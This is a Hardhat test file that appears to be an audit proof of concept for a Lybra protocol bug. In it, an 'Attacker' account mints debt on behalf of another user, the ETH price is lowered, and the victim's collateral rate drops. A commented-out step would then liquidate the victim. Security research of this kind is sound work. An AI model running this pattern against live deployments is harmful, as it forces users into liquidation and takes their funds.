import { expect } from "chai";
import { ethers } from "hardhat";
import { Lybra } from "../typechain/Lybra";
import { Signer } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { MockLybra } from "../typechain/MockLybra";
import { PriceFeed } from "../typechain";

describe("Lybra Bug", function () {
    let userA: SignerWithAddress, Attacker: SignerWithAddress;
    let _lybra: MockLybra;
    let _priceFeed: PriceFeed;
    // let _esLBRMinerV2: esLBRMinerV2;
    // let _helper;
    // let _boost;
    // let _fund;


    beforeEach(async function () {
        [userA, Attacker] = await ethers.getSigners();
        const Lybra__fac = await ethers.getContractFactory("MockLybra");
        _lybra = await Lybra__fac.deploy();

        const Price__fac = await ethers.getContractFactory("PriceFeed");
        _priceFeed = await Price__fac.deploy();
        await _lybra.setPriceFeed(_priceFeed.address);
        await _priceFeed.setPrice(1500);

        // const esLBRMinerV2__fac = await ethers.getContractFactory("esLBRMinerV2");
        // _esLBRMinerV2 = await esLBRMinerV2__fac.deploy(_lybra.address, _helper.address, _boost.address, _fund.address);
        // await _lybra.setPriceFeed(_priceFeed.address);



    })

    it("Should increase CollateralRate of user", async function () {
        var mintAmount = ethers.BigNumber.from(1500 * 50);
        await _lybra.depositEtherToMint(userA.address, mintAmount, { value: ethers.utils.parseEther("100") });
        var collateralRateOf = await _lybra.collateralRateOf(userA.address)

        console.log("collateralRateOf userA is", collateralRateOf.toString());


        let limit = await _lybra.borrowedLimitOf(ethers.utils.parseEther("101"));
        limit = limit.sub(mintAmount)

        await _lybra.connect(Attacker).depositEtherToMint(userA.address, limit, { value: ethers.utils.parseEther("1") });
        var collateralRateOf_new = await _lybra.collateralRateOf(userA.address)
        console.log("collateralRateOf userA is", collateralRateOf_new.toString());

        await _priceFeed.setPrice(1200);

        collateralRateOf_new = await _lybra.collateralRateOf(userA.address)
        console.log("collateralRateOf userA is", collateralRateOf_new.toString());

        // await _lybra.connect(Attacker).becomeRedemptionProvider(true);
        // await _lybra.liquidation(Attacker.address,userA.address,ethers.utils.parseEther("1"));

    });
});
